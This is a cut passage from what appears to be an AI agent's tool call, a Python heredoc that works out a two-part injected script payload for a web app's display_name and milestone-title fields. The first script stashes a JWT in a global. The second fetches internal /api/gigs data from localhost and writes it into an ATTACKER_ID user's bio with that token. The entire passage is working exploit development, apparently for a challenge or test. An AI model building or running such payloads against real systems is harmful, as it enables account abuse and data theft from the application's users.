rer ' + JWT)}\")\n\n# Even just storing the JWT takes: 'Bearer ' + JWT = 7 + 220 = 227 chars\n# Plus <script>window._j=\"\";</script> = 29 chars\n# Total = ~257... slightly over 255\n\n# Let's try without \"Bearer \" prefix and add it in script 2\nscript1_v2 = f'<script>_j=\"{JWT}\";_u=\"{ATTACKER_ID}\";</script>'\nprint(f\"\\nScript 1 v2 length: {len(script1_v2)}\")\n# JWT = 220 chars + ATTACKER_ID = 36 chars + overhead = ~290... still too long\n\n# What if we only store the JWT and hardcode the attacker_id in script 2?\nscript1_v3 = f'<script>_j=\"{JWT}\";</script>'\nprint(f\"\\nScript 1 v3 length (just JWT): {len(script1_v3)}\")\n# 220 + 18 = 238 chars - fits in 255!\n\n# Script 2: Use the JWT global to make the SSRF fetch\nscript2 = f'<script>fetch(\"http://localhost:3000/api/gigs\").then(r=>r.text()).then(d=>fetch(\"http://localhost:3000/api/users/{ATTACKER_ID}\",{{method:\"PUT\",headers:{{\"Authorization\":\"Bearer \"+_j,\"Content-Type\":\"application/json\"}},body:JSON.stringify({{bio:d.slice(0,200)}})}}))</script>'\nprint(f\"\\nScript 2 length: {len(script2)}\")\nPYEOF","description":"Design two-script SSRF payload split across display_name and milestone title"},"caller":{"type":"direct"}}
